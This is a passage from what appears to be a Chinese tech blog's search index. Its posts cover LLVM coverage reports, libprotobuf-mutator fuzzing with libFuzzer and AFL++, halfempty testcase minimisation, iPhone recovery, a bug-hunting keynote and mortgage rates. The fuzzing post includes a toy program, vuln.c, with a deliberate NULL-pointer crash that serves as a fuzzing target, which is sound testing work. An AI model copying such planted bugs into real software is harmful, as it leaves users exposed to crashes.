利率有18家报价，去掉一个最高值，去掉一个最低值，剩下16家取算术平均取得。 个人或者企业向银行贷款时的利率，通过 LPR 计算。 1房贷利率 = LPR 利率 + 加点 同样加点可以上浮，也可以下浮，这个是你和银行之间的协议加点。最终的利率还和政策加点有关，比如有的城市规定，二套房上浮 60个基点 （一个基点为 0.01 %），即上浮 0.6% 所以最终的公式为： 1房贷利率 = LPR 利率 + 政策加点 + 协议加点","link":"/cn/lpr/"},{"title":"llvm Coverage 可视化","text":"Google 提供的工具Google 提供了一个工具 https://cs.chromium.org/chromium/src/tools/code_coverage/coverage.py 12345678$ gn gen out/coverage \\ --args='use_clang_coverage=true is_component_build=false dcheck_always_on=true'$ python tools/code_coverage/coverage.py \\ crypto_unittests url_unittests \\ -b out/coverage -o out/report \\ -c 'out/coverage/crypto_unittests' \\ -c 'out/coverage/url_unittests --gtest_filter=URLParser.PathURL' \\ -f url/ -f crypto/ 一些参数的含义: 1234-b 测试 coverage 的 target 的路径-o 输出报告的路径-c 测试 coverage 的命令行-f 过滤，只显示某些路径的 coverage 实际操作表明， coverage.py 不是太好用。 还是需要一步一步来，比较稳妥。 (0) 编译在 chromium 项目下，可以直接使用 use_clang_coverage=true and is_component_build=false如果不是 chromium 项目， 则需要自己 指定参数， 例如在 skia 项目中，可以这么写： args.gn 1234cc = &quot;/home/henices/clang7/bin/clang&quot;cxx = &quot;/home/henices/clang7/bin/clang++&quot;extra_cflags = [ &quot;-fprofile-instr-generate&quot;, &quot;-fcoverage-mapping&quot; ]extra_ldflags = [ &quot;-fprofile-instr-generate&quot;, &quot;-fcoverage-mapping&quot; ] 如果是自己的项目，使用 clang 编译时加上这两个参数 -fprofile-instr-generate -fcoverage-mapping (1) 生成 Raw Profiles 文件export LLVM_PROFILE_FILE=&quot;out/report/target.%4m.profraw&quot; 使用这个命令限制 profraw 文件的个数。 %p 进程 ID%h hostname%Nm 生成几个 profraw 文件 写个循环，将所有的样本跑一遍。 timeout 10 指定程序超时时间。 1for i in path ; do timeout 10 target $i ; done 将在 out/report 目录下， 生成 profraw 文件， 如果没有生成， 则说明上面的代码编译出了问题。 (2) 生成 Indexed Profile/home/henices/clang7/bin/llvm-profdata merge -j=1 -sparse -o out/report/coverage.profdata out/report/*.profraw -sparse 能大幅减小 profraw 文件大小 (3) 生成 Coverage report123/home/henices/clang7/bin/llvm-cov show -output-dir=out/report -format=html \\ -Xdemangler c++filt -Xdemangler -n -instr-profile=out/report/coverage.profdata \\ -object=out/coverage/target 打开 out/report/index.html 可以看到详细的 html 报告，非常不错。 参考链接 working with release branches Code Coverage in Chromium Check Code Coverage with Clang and LCOV oss-fuzz coverage Source-based Code Coverage","link":"/cn/llvm_coverage/"},{"title":"libprotobuf-mutator 简单分析","text":"What are protocol buffers?Protocol buffers are Google’s language-neutral, platform-neutral, extensible mechanism for serializing structured data – think XML, but smaller, faster, and simpler. You define how you want your data to be structured once, then you can use special generated source code to easily write and read your structured data to and from a variety of data streams and using a variety of languages. 这段是 Google 官方网站给出的介绍，protobuf 可以自动化生成代码，用于读入或者写入结构化数据。一个简单的 protobuf 文件可以是这样的： 12345message Person { required string name = 1; required int32 id = 2; optional string email = 3;} 具体的语法可以参考Google 的文档 proto2 和 proto3。c++ 语言使用 protobuf 的示例可以参见Protocol Buffer Basics: C++ 文档，基本步骤总结如下： 写 protobuf 文件，表达数据结构 利用 protoc 自动生成代码 （支持多种语言 C++ Java 等） 利用生成的文件解析或者写入相关数据结构 libprotobuf-mutator编译安装参考： https://github.com/google/libprotobuf-mutator/blob/master/README.md 12345git clone https://github.com/google/libprotobuf-mutator.gitmkdir buildcd buildcmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debughttps_proxy=http://127.0.0.1:3128 ninja check 由于需要从Google下载一些源码，所以在 ninja check 的时候需要挂上代理，结果编译出错了，找不到 libxml2.a，排查一下编译参数，发现需要添加编译静态库的参数 123456789101112diff --git a/cmake/external/libxml2.cmake b/cmake/external/libxml2.cmakeindex c00ace2..a944fab 100644--- a/cmake/external/libxml2.cmake+++ b/cmake/external/libxml2.cmake@@ -38,6 +38,7 @@ ExternalProject_Add(${LIBXML2_TARGET} UPDATE_COMMAND &quot;&quot; CONFIGURE_COMMAND ${LIBXML2_SRC_DIR}/autogen.sh --without-python --prefix=${LIBXML2_INSTALL_DIR}+ --enable-static=yes CC=${CMAKE_C_COMPILER} CXX=${CMAKE_CXX_COMPILER} CFLAGS=${LIBXML2_CFLAGS} 修改后可以正常通过 ninja check 命令的所有检查。默认情况下 ninja install 会安装到 /usr/local 目录，因为考虑到后续需要给 afl+使用，所以需要使用下的命令重新 cmake 一下 12cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON \\-DCMAKE_INSTALL_PREFIX=/home/henices/code/AFL+/external/libprotobuf-mutator -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug libprotobuf-mutator 代码实现libfuzzer_macro.h 1234567891011121314151617181920212223242526272829#define DEFINE_TEST_ONE_PROTO_INPUT_IMPL(use_binary, Proto) \\ extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) { \\ using protobuf_mutator::libfuzzer::LoadProtoInput; \\ Proto input; \\ if (LoadProtoInput(use_binary, data, size, &amp;input)) \\ TestOneProtoInput(input); \\ return 0; \\ } // Defines custom mutator, crossover and test functions using default// serialization format. Default is text.#define DEFINE_PROTO_FUZZER(arg) DEFINE_TEXT_PROTO_FUZZER(arg)// Defines custom mutator, crossover and test functions using text// serialization. This format is more convenient to read.#define DEFINE_TEXT_PROTO_FUZZER(arg) DEFINE_PROTO_FUZZER_IMPL(false, arg)// Defines custom mutator, crossover and test functions using binary// serialization. This makes mutations faster. However often test function is// significantly slower than mutator, so fuzzing rate may stay unchanged.#define DEFINE_BINARY_PROTO_FUZZER(arg) DEFINE_PROTO_FUZZER_IMPL(true, arg)#define DEFINE_PROTO_FUZZER_IMPL(use_binary, arg) \\ static void TestOneProtoInput(arg); \\ using FuzzerProtoType = std::remove_const&lt;std::remove_reference&lt; \\ std::function&lt;decltype(TestOneProtoInput)&gt;::argument_type&gt;::type&gt;::type; \\ DEFINE_CUSTOM_PROTO_MUTATOR_IMPL(use_binary, FuzzerProtoType) \\ DEFINE_CUSTOM_PROTO_CROSSOVER_IMPL(use_binary, FuzzerProtoType) \\ DEFINE_TEST_ONE_PROTO_INPUT_IMPL(use_binary, FuzzerProtoType) \\ DEFINE_POST_PROCESS_PROTO_MUTATION_IMPL(FuzzerProtoType) \\ static void TestOneProtoInput(arg) 调用路径为 DEFINE_PROTO_FUZZER -&gt; DEFINE_TEXT_PROTO_FUZZER -&gt; DEFINE_PROTO_FUZZER_IMPL -&gt; DEFINE_TEST_ONE_PROTO_INPUT_IMPL -&gt; LLVMFuzzerTestOneInput -&gt; TestOneProtoInput。最终还是实现了LLVMFuzzerTestOneInput libfuzzer 的入口方法，使用 macro 可以少写不少代码非常方便，从这里就可以看出 fuzz 的 target function 必须和 LLVMFuzzerTestOneInput 的参数类型一致 12345// fuzz_target.ccextern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) { DoSomethingInterestingWithMyAPI(Data, Size); return 0; // Non-zero return values are reserved for future use.} libfuzzer_macro.cc 12345678910bool LoadProtoInput(bool binary, const uint8_t* data, size_t size, protobuf::Message* input) { if (GetCache()-&gt;LoadIfSame(data, size, input)) return true; auto result = binary ? ParseBinaryMessage(data, size, input) : ParseTextMessage(data, size, input); if (!result) return false; GetMutator()-&gt;Seed(size); GetMutator()-&gt;Fix(input); return true;} LoadProtoInput 返回 true 或者 false，如果解析成功，将调用 TestOneProtoInput，DEFINE_PROTO_FUZZER macro 其实就是写 TestOneProtoInput 的实现。 libprotobuf-mutator_fuzzing_learning这是 github 上一位同行写的学习 libprotobuf-mutator fuzzing 的文章，总体写的不错，但是其中有一些错误的地方，在实践过程中都记录了其中的修改。 Simple protobuf example文章：https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/1_simple_protobuf 先写一个简单的 protobuf 文件，test.proto 123456syntax = &quot;proto2&quot;;message TEST { required uint32 a = 1; required string b = 2;} 使用 protoc 编译 protobuf 文件 12mkdir genfiles protoc ./test.proto --cpp_out=./genfiles 将自动生成两个文件 12ls ./genfilestest.pb.cc test.pb.h 写一个测试程序 test_proto.cc 1234567891011121314151617#include &quot;test.pb.h&quot;#include &lt;bits/stdc++.h&gt;using std::cin;using std::cout;using std::endl;int main(int argc, char *argv[]){ TEST t; t.set_a(101); t.set_b(&quot;testtest&quot;); cout &lt;&lt; t.a() &lt;&lt; endl; cout &lt;&lt; t.b() &lt;&lt; endl; return 0;} 写 Makefile 来编译 test_proto.cc 12345678910111213CXX=clang++PB_SRC=test.pb.ccPROTOBUF_DIR=$(HOME)/code/libprotobuf-mutator/build/external.protobuf/PROTOBUF_LIB=$(PROTOBUF_DIR)/lib/libprotobufd.aINC=-I$(PROTOBUF_DIR)/includetest_proto: test_proto.cc $(PB_SRC) $(CXX) -o $@ $^ $(PROTOBUF_LIB) $(INC).PHONY: cleanclean: rm test_proto 执行 make 后报错 ./test.pb.h:17:2: error: This file was generated by an older version of protoc which is，因为我们在编译的时候使用了 -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON 下载了新版本的 protobuf，所以出了这个错误。只好使用下载的 protoc 重新生成 test.pb.cc 和 test.pb.h 1~/code/libprotobuf-mutator/build/external.protobuf/bin/protoc ./test.proto --cpp_out=./genfiles 这次可以成功 make 了，实际执行的命令是 12clang++ -o test_proto test_proto.cc test.pb.cc /home/henices/code/libprotobuf-mutator/build/external.protobuf//lib/libprotobufd.a \\ -I/home/henices/code/libprotobuf-mutator/build/external.protobuf//include 运行 ./test_proto, 输出如下 12101testtest Combine libprotobuf-mutator with libfuzzer代码在： https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/2_libprotobuf_libfuzzer harness.cc 123456789#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;extern &quot;C&quot; int FuzzTEST(const uint8_t *data, size_t size) { if(data[0] == '\\x01') { __builtin_trap(); } return 0;} 其中 FuzzTEST 是我们需要测试的目标函数。 lpm_libfuzz.cc 1234567891011121314151617181920212223242526272829303132333435#include &quot;libprotobuf-mutator/src/libfuzzer/libfuzzer_macro.h&quot;#include &quot;test.pb.h&quot;#include &lt;bits/stdc++.h&gt;using std::cin;using std::cout;using std::endl;std::string ProtoToData(const TEST &amp;test_proto) { std::stringstream all; const auto &amp;aa = test_proto.a(); const auto &amp;bb = test_proto.b(); all.write((const char*)&amp;aa, sizeof(aa)); if(bb.size() != 0) { all.write(bb.c_str(), bb.size()); } std::string res = all.str(); if (bb.size() != 0 &amp;&amp; res.size() != 0) { // set PROTO_FUZZER_DUMP_PATH env to dump the serialized protobuf if (const char *dump_path = getenv(&quot;PROTO_FUZZER_DUMP_PATH&quot;)) { std::ofstream of(dump_path); of.write(res.data(), res.size()); } } return res;}extern &quot;C&quot; int FuzzTEST(const uint8_t* data, size_t size); // our customized fuzzing functionDEFINE_PROTO_FUZZER(const TEST &amp;test_proto) { auto s = ProtoToData(test_proto); // convert protobuf to raw data FuzzTEST((const uint8_t*)s.data(), s.size()); // fuzz the function} 在文件的最开头导入 libfuzzer_macro.h， 后面就可以使用一些宏来写代码了，DEFINE_PROTO_FUZZER 是关键的 fuzzer 入口。结构化变异部分 libprotobuf-mutator 已经完成了，需要实现的是一个由 protobuf 转需要的数据类型的函数，如上面的 ProtoToData 代码编译1234567891011121314151617181920212223242526TARGET=lpm_libfuzzCXX=clang++CXXFLAGS=-g -fsanitize=fuzzer,addressPB_SRC=test.pb.ccPROTOBUF_DIR=$(HOME)/code/libprotobuf-mutator/build/external.protobuf/LPM_DIR=$(HOME)/code/AFL+/external/libprotobuf-mutatorPROTOBUF_LIB=$(PROTOBUF_DIR)/lib/libprotobufd.aLPM_LIB=$(LPM_DIR)/lib/libprotobuf-mutator-libfuzzer.a $(LPM_DIR)/lib/libprotobuf-mutator.aINC=-I$(PROTOBUF_DIR)/include -I$(LPM_DIR)/includeDFUZZ=-DLLVMFuzzerTestOneInput=FuzzTESTall: $(TARGET)# for testing libprotobuf + libfuzzer# compile harness first# then link lpm_libfuzz with harness.o &amp; static librariesharness.o: harness.cc $(CXX) $(CXXFLAGS) -c $(DFUZZ) $&lt;$(TARGET): harness.o $(TARGET).cc $(CXX) $(CXXFLAGS) -o $@ $^ $(PB_SRC) $(LPM_LIB) $(PROTOBUF_LIB) $(INC) # $(LPM_LIB) must be placed before $(PROTOBUF_LIB).PHONY: cleanclean: rm $(TARGET) *.o make 后报错，找不到头文件 1234/home/henices/code/AFL+/external/libprotobuf-mutator/include/libprotobuf-mutator/src/libfuzzer/libfuzzer_macro.h:24:10: fatal error: 'port/protobuf.h' file not found#include &quot;port/protobuf.h&quot; ^~~~~~~~~~~~~~~~~1 error generated. port/protobuf.h 来自 https://github.com/google/libprotobuf-mutator/blob/master/port/protobuf.h 修改 Makefile 如下 1234567891011121314151617181920212223242526TARGET=lpm_libfuzzCXX=clang++CXXFLAGS=-g -fsanitize=fuzzer,addressPB_SRC=test.pb.ccPROTOBUF_DIR=$(HOME)/code/libprotobuf-mutator/build/external.protobuf/LPM_DIR=$(HOME)/code/AFL+/external/libprotobuf-mutatorPROTOBUF_LIB=$(PROTOBUF_DIR)/lib/libprotobufd.aLPM_LIB=$(LPM_DIR)/lib/libprotobuf-mutator-libfuzzer.a $(LPM_DIR)/lib/libprotobuf-mutator.aINC=-I$(PROTOBUF_DIR)/include -I$(HOME)/code/libprotobuf-mutator/ -I$(LPM_DIR)/includeDFUZZ=-DLLVMFuzzerTestOneInput=FuzzTESTall: $(TARGET)# for testing libprotobuf + libfuzzer# compile harness first# then link lpm_libfuzz with harness.o &amp; static librariesharness.o: harness.cc $(CXX) $(CXXFLAGS) -c $(DFUZZ) $&lt;$(TARGET): harness.o $(TARGET).cc $(CXX) $(CXXFLAGS) -o $@ $^ $(PB_SRC) $(LPM_LIB) $(PROTOBUF_LIB) $(INC) # $(LPM_LIB) must be placed before $(PROTOBUF_LIB).PHONY: cleanclean: rm $(TARGET) *.o 修改 makefile 后，可以正常编译通过。经过我们上面的分析，不需要定义 DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST 将这行删除掉，同样可以编译通过。 执行 lpm_libfuzz 运行正常 1234567891011121314151617181920➜ ./lpm_libfuzz INFO: found LLVMFuzzerCustomMutator (0x758a80). Disabling -len_control by default.INFO: Running with entropic power schedule (0xFF, 100). INFO: Seed: 331712324 INFO: Loaded 1 modules (434 inline 8-bit counters): 434 [0xa056b8, 0xa0586a), INFO: Loaded 1 PC tables (434 PCs): 434 [0x939398,0x93aeb8), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED cov: 82 ft: 83 corp: 1/1b exec/s: 0 rss: 35Mb NEW_FUNC[1/41]: 0x75abb0 in TEST::~TEST() /tmp/genfiles/test.pb.cc:116 NEW_FUNC[2/41]: 0x75ca10 in google::protobuf::UnknownFieldSet* google::protobuf::internal::InternalMetadata::mutable_unknown_fields&lt;google::protobuf::UnknownFieldSet&gt;() /home/henices/code/libprotobuf-mutator/build/external.protobuf//include/google/protobuf/metadata_lite.h:117#3 NEW cov: 135 ft: 159 corp: 2/12b lim: 4096 exec/s: 0 rss: 36Mb L: 11/11 MS: 1 CustomCrossOver-#4 NEW cov: 138 ft: 162 corp: 3/201b lim: 4096 exec/s: 0 rss: 36Mb L: 189/189 MS: 2 InsertRepeatedBytes-Custom-#38 REDUCE cov: 138 ft: 162 corp: 3/127b lim: 4096 exec/s: 0 rss: 37Mb L: 115/115 MS: 5 CustomCrossOver-CustomCrossOver-Custom-InsertRepeatedBytes-Custom-#60 REDUCE cov: 138 ft: 162 corp: 3/124b lim: 4096 exec/s: 0 rss: 37Mb L: 112/112 MS: 4 CustomCrossOver-ShuffleBytes-ChangeByte-Custom-#98 REDUCE cov: 138 ft: 162 corp: 3/56b lim: 4096 exec/s: 0 rss: 37Mb L: 44/44 MS: 5 CrossOver-Custom-Custom-CMP-Custom- DE: &quot;~\\xff\\xff\\xff\\xff\\xff\\xff\\xff&quot;-#144 REDUCE cov: 138 ft: 162 corp: 3/53b lim: 4096 exec/s: 0 rss: 37Mb L: 41/41 MS: 2 CrossOver-Custom-#182 REDUCE cov: 138 ft: 162 corp: 3/25b lim: 4096 exec/s: 0 rss: 37Mb L: 13/13 MS: 5 ChangeBit-Custom-Custom-InsertByte-Custom-#324 REDUCE cov: 138 ft: 162 corp: 3/24b lim: 4096 exec/s: 0 rss: 38Mb L: 12/12 MS: 3 CustomCrossOver-EraseBytes-Custom- Handling input from AFL++ in our custom mutatorhttps://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/5_libprotobuf_aflpp_custom_mutator_input 主要内容是将 libprotobuf-mutator 和 afl++ 结合起来，使用的 afl++ 的 custom mutator，值得一提的是在这个例子里，需要使用 -fPIC 参数编译 libprotobuf-mutator。 1234cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON \\-DCMAKE_INSTALL_PREFIX=/home/henices/code/AFL+/external/libprotobuf-mutator \\-DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug \\-DCMAKE_C_FLAGS=&quot;-fPIC&quot; -DCMAKE_CXX_FLAGS=&quot;-fPIC&quot; 主要的步骤在 readme.md 中已经介绍得比较清楚了。 lpm_aflpp_custom_mutator_input.cc 是 afl++ 的 custom mutator shared library 解析输入数据（testcase buffer）并将其转成 TEST protobuf message 使用 libprotobuf-mutator 变异 TEST protobuf message 注册一个 PostProcessor 处理变异后的 TEST protobuf message （非必要步骤） 1234567891011121314151617181920212223242526272829303132333435extern &quot;C&quot; size_t afl_custom_fuzz(MyMutator *mutator, // return value from afl_custom_init uint8_t *buf, size_t buf_size, // input data to be mutated uint8_t **out_buf, // output buffer uint8_t *add_buf, size_t add_buf_size, // add_buf can be NULL size_t max_size) { // This function can be named either &quot;afl_custom_fuzz&quot; or &quot;afl_custom_mutator&quot; // A simple test shows that &quot;buf&quot; will be the content of the current test case // &quot;add_buf&quot; will be the next test case ( from AFL++'s input queue ) TEST input; // parse input data to TEST // Notice that input data should be a serialized protobuf data // Check ./in/ii and test_protobuf_serializer for more detail bool parse_ok = input.ParseFromArray(buf, buf_size); if(!parse_ok) { // Invalid serialize protobuf data. Don't mutate. // Return a dummy buffer. Also mutated_size = 0 static uint8_t *dummy = new uint8_t[10]; // dummy buffer with no data *out_buf = dummy; return 0; } // mutate the protobuf mutator-&gt;Mutate(&amp;input, max_size); // Convert protobuf to raw data const TEST *p = &amp;input; std::string s = ProtoToData(*p); // Copy to a new buffer ( mutated_out ) size_t mutated_size = s.size() &lt;= max_size ? s.size() : max_size; // check if raw data's size is larger than max_size uint8_t *mutated_out = new uint8_t[mutated_size+1]; memcpy(mutated_out, s.c_str(), mutated_size); // copy the mutated data // Assign the mutated data and return mutated_size *out_buf = mutated_out; return mutated_size;} mutator-&gt;Mutate(&amp;input, max_size); 为真正起作用的核心代码 lpm_aflpp_custom_mutator_input.h 继承了protobuf_mutator::Mutator， 可以使用 libprotobuf-mutator 的 Mutate 方法 1234567#include &quot;libprotobuf-mutator/src/mutator.h&quot;#include &quot;test.pb.h&quot;#include &lt;bits/stdc++.h&gt;class MyMutator : public protobuf_mutator::Mutator {}; test_proto_serializer.cc 用于生成一条序列化的 TEST protobuf message，可以作为 fuzz 的初始化 testcase 使用 vuln.c 漏洞测试程序 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;math.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main(int argc, char *argv[]){ char str[100]={}; read(0, str, 100); int *ptr = NULL; if( str[0] == '\\x02' || str[0] == '\\xe8') { *ptr = 123; } return 0;} 漏洞测试程序比较简单，只要第一个字节是 0xe8 或者 0x02 即可，libprotobuf-mutator 的变异在这个例子里效率并不高，所以需要使用 PostProcessor 来优化变异。 Makefile 12345678910111213141516171819202122232425262728TARGET=lpm_aflpp_custom_mutator_inputCXX=clang++-11AFLCC=$(HOME)/AFLplusplus/afl-gccPB_SRC=test.pb.ccPROTOBUF_DIR=$(HOME)/libprotobuf-mutator/build/external.protobufPROTOBUF_LIB=$(PROTOBUF_DIR)/lib/libprotobufd.aLPM_DIR=$(HOME)/libprotobuf-mutatorLPM_LIB=$(LPM_DIR)/build/src/libfuzzer/libprotobuf-mutator-libfuzzer.a $(LPM_DIR)/build/src/libprotobuf-mutator.aINC=-I$(PROTOBUF_DIR)/include -I$(LPM_DIR)all: $(TARGET).so$(TARGET).so: $(TARGET).cc $(PB_SRC) $(CXX) -fPIC -c $^ $(INC) $(CXX) -shared -Wall -O3 -o $@ *.o $(LPM_LIB) $(PROTOBUF_LIB)vuln: vuln.c $(AFLCC) -o $@ $^test_proto_serializer: test_proto_serializer.cc $(PB_SRC) $(CXX) -o $@ $^ $(PROTOBUF_LIB) $(INC).PHONY: cleanclean: rm *.so *.o vuln test_proto_serializer Makefile 有瑕疵，这个章节的内容和 libfuzzer 没有关系，不需要链接 libprotobuf-mutator-libfuzzer.a 参考资料https://developers.google.com/protocol-buffers/docs/cpptutorialhttps://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.mdhttps://github.com/google/libprotobuf-mutator/https://llvm.org/docs/LibFuzzer.htmlhttps://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning","link":"/cn/libprotobuf-mutator/"},{"title":"iPhone 内存满了, 白苹果问题解决方法","text":"上周媳妇的 iPhone 提示内存满了，重启后就进入白苹果状态。安装 itunes 以更新的方式重刷系统后恢复正常 （如果选择恢复模式则会丢失数据）。刷系统的时候一度遇上 14 错误，重新使用更新系统的方式再刷了一遍后，顺利通过 （运气不错）。顺利登录 iPhone 后马上删除各种 App，清理后台驻留的程序，在此也提示大家 iPhone 手机也是要定期维护啊。 说起来就上面几句话，实际操作起来比较麻烦，大概弄了一个早上，把几个要点总结一下。 强制重新启动 iPhone其实在刷机前我尝试了强制重启 iPhone，强制重启 iPhone 的方法可以参考下面链接：https://support.apple.com/zh-cn/guide/iphone/iph8903c3ee6/ios 新版 iPhone 可以使用下面的方法 12345强制重新启动配备面容 ID 的 iPhone若要强制重新启动 iPhone X、iPhone XS、iPhone XR、iPhone 11、iPhone 12 或 iPhone 13，请执行以下操作：按下并快速松开调高音量按钮，按下并快速松开调低音量按钮，然后按住侧边按钮。当 Apple 标志出现时，松开按钮。 但是强制重启 iPhone 并没有成功，手机依然处于白苹果状态没有响应。 进入 DFU 模式不进入 DFU 模式无法刷机，iPhone 不同机型进入 DFU 模式的方法不相同，具体的可以参考下面链接：https://support.apple.com/en-us/HT201263 123iPhone 8 or later: Press and quickly release the Volume Up button. Press and quickly release the Volume Down button. Then, press and hold the Side button until you see the recovery mode screen. 安装 itunes 刷机安装 itunes 的过程就不在细说了，正常安装即可。更新过程需要注意中间某个步骤可能耗时很长，不要着急得慢慢等，Apple 还专门有链接说明这个问题。https://support.apple.com/zh-cn/HT203435 1234567出现这种情况后，进度条可能移动非常缓慢或似乎不移动。请等待设备完成更新、恢复或抹掉过程。进度条会显示安装进度。所用时间取决于设备上的文件数量，以及您是要抹掉、更新还是升级 iOS 或 iPadOS。如果设备上只有很少数据或没有数据，或者如果您要抹掉设备上的数据，这个过程可能只需一分钟时间。如果设备包含大量文件，则这个过程可能需要数分钟至一小时不等。 刷机过程中大概率会遇上 14 错误，网络上说法很多大概就两点。 （1）挑线，要保证 USB 数据线有效，优先使用 USB 2.0 （2）多刷几次，反复刷 我这次运气不错，遇上 14 错误后，换了个 USB 2.0 的口重刷一次就过了，祝大家好运。 重启后需要输入密码，提示尝试恢复数据，进度跑完就大功告成了。 事后的清理工作恢复完数据，登录媳妇的手机发现以下几点问题： （1） 手机存储空间紧张 （2） 后台驻留的程序比较多 导致白苹果的原因未知，将这些问题解决了一下，希望能正常使用了。","link":"/cn/iPhone_white_apple/"},{"title":"Keynote - How Do You Actually Find Bugs?","text":"https://www.youtube.com/watch?v=7Ysy6iA2sqA&amp;ab_channel=OffensiveCon Temperament Curiosity Detail-oriented Ability to deal with failure and continual evidence that you’re wrong Learn how to deal with failure Two projects (can be unrealeted, or different parts of the same) Learn to recognize whe you have hit a wall and have become unproductive Switch to your secondary project Consider having a development project as your seconary project Do an achiveable, measurable task Regain a sense of achievement Moving on - Knowning when to quit You will return it in the future Motivation - Remaining Enager The more you’re curious about how a technology works or how an algorithm achives its goal, the less monotonous code review is Motivation - bug patching bugs being patched is frustrating … but they are evidence that you were on the right track! Confidence Research is a daunting filed to enter Some security reseacher you respect had the same self-doubt coming in, and have recurrences from time to time Growth mindset: “I can’t do that … Yet” Bias and assumptions Common code reviewer biases Everyone has looked at the already (many eyes make all bugs shallow) Even if I found something, it will be unexploitable (Server side) The X attack surface is not interesting now (eg, media parsing in browsers) There are no more bugs in this The protocol doesn’t allow you to do X Auditing Process Understanding the code Documenting your findings Identifying bias Tooling Revisit the code base Analyze failures Attampt to understand the code A lot of people try to short-circuit this process Reliance on tools Fuzzers/static analyzers are a guide, not the whole process Many of today’s vulnerabilities are complex, and require in-depth understanding of the codebase The more you understand about how the program works, the better equipped you are to find bugs ( and exploit them) The best way to understand how something works is to explain to someone else What I’m looking for software risk = available attack surface * complexity attack surface can be indirect even mitigations are attack surface often you initial perception of attack surface is naive Hidden/non-obvious attack surfaces are the best Complexity is plentiful Feature driven (thanks w3c) Legacy support Often avoidable: the anomaly of cheap complexity Borrwoing ideas Bugtracker / Diffs Can show where a bug is Can inspire new ideas: variants, same bugs in other codebase Mean but viable: track commits by error-prone developers Comments in the codebase Descripbe things I’d never thought of Document your findings Get into the habit of documenting ideas, bugs candidates, idiosyncrasies, data structure, algorithms Documenting failed ideas is as important as documenting successful ones avoids repeating thie idea sometime later Long term view: I’m going to revisit this later Revisit code bases and failed bugs code bases are not static coee rewritten Features added/changed Environment is not static Analyze your failures if someone succeeds where you didn’t, have a look at what they found Try to figure out: why did I miss it? Is this a one-off or teachable trick/blind spot Can you improve on that? Is there a pattern in those falures? Failures is an oppotunity to learn","link":"/cn/How_do_you_actually_find_bugs/"},{"title":"halfempty 的一些使用说明","text":"https://github.com/googleprojectzero/halfempty google P0 @taviso 提供的 testcase 并行快速精简工具 （A fast, parallel test case minimization tool）需要注意的是 halfempty 只能精简导致目标程序 crash 的 testcase，如果 testcase 不导致目标程序 crash， 还是需要使用 afl-tmin 类似的工具根据 coverage 来精简。 halfempty 工具向测试脚本传递内容时使用的是 pipe， 如果测试的程序只接受文件路径作为参数时，需要一些技巧，README 虽然有提及但是说的比较晦涩。 以 upx 为例，upx 的命令行帮助如下 12345678910111213141516171819202122root@fuzzing-5:/mnt/disk/halfempty# ./upx.out_x86-64 Ultimate Packer for eXecutables Copyright (C) 1996 - 2020UPX git-d7ba31+ Markus Oberhumer, Laszlo Molnar &amp; John Reiser Jan 23rd 2020Usage: upx.out_x86-64 [-123456789dlthVL] [-qvfk] [-o file] file..Commands: -1 compress faster -9 compress better -d decompress -l list compressed file -t test compressed file -V display version number -h give more help -L display software licenseOptions: -q be quiet -v be verbose -oFILE write output to 'FILE' -f force compression of suspicious files -k keep backup filesfile.. executables to (de)compressType 'upx.out_x86-64 --help' for more detailed help.UPX comes with ABSOLUTELY NO WARRANTY; for details visit https://upx.github.io upx 只能使用文件路径作为参数， 比如像这样执行命令。 ./upx.out_x86-64 crash.upx 按照 README 中的例子编写测试脚本 test.sh 123456789#!/bin/sh./upx.out_x86-64 $1if test $? -eq 139; then exit 0else exit 1fi 执行的时候会报错 12345678910111213./halfempty ./test.sh crash.upx╭│ │ ── halfempty ───────────────────────────────────────────────── v0.30 ──╰│ 16│ A fast, parallel testcase minimization tool ╰───╯ ───────────────────────────────────────────────────────── by @taviso ──Input file &quot;crash.upx&quot; is now 19088 bytes, starting strategy &quot;bisect&quot;...Verifying the original input executes successfully... (skip with --noverify)** Message: This program expected `./test1.sh` to return successfully** Message: for the original input (i.e. exitcode zero).** Message: Try it yourself to verify it's working.** Message: Use a command like: `cat crash.upx | ./test.sh || echo failed`** (halfempty:2477): WARNING **: Strategy &quot;bisect&quot; failed, cannot continue. 正确的方法是使用临时文件，因为 halfempty 是一个并行的工具，每次使用的临时文件都应该不一样。 1234567891011#!/bin/shtempfile=`mktemp` &amp;&amp; cat &gt; ${tempfile}./upx.out_x86-64 ${tempfile}if test $? -eq 139; then exit 0else exit 1fi 运行后的输出，大致如下 12345678910root@fuzzing-5:/mnt/disk/halfempty# ./halfempty ./test.sh crash.upx ╭│ │ ── halfempty ───────────────────────────────────────────────── v0.30 ──╰│ 16│ A fast, parallel testcase minimization tool ╰───╯ ───────────────────────────────────────────────────────── by @taviso ──Input file &quot;crash.upx&quot; is now 19088 bytes, starting strategy &quot;bisect&quot;...Verifying the original input executes successfully... (skip with --noverify)The original input file succeeded after 0.0 seconds.New finalized size: 19088 (depth=2) real=0.0s, user=0.0s, speedup=~-0.0streesize=6654, height=6376, unproc=0, real=4.4^C user=19.3s, speedup=~14.9s 已经可以正常运行了。","link":"/cn/halfempty/"},{"title":"gogs 皮肤和源码升级","text":"gogs 使用了也有一年多了，小团队使用基本还行。有几个问题，第一界面代码 merge 有问题，第二不支持代码 